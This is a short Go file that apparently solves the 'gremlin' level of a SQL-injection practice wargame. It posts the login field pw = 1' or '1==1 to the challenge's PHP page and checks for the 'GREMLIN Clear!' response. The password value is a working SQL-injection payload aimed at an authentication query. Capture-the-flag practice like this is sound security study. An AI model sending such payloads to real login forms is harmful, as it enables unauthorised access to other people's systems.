package problem

import(
	"fmt"
	"strings"
)

func Gremlin(session string){
	file := "gremlin_0be5fca1b7854b01253c5326959a4316.php"
	param := map[string]string{
		"id" : "gremlin",
		"pw" : "1' or '1==1",
	}
	
	contents := connect(file, param, session)
	if strings.Contains(string(contents),"GREMLIN Clear!"){
		fmt.Println("GREMLIN Clear!")
	}
}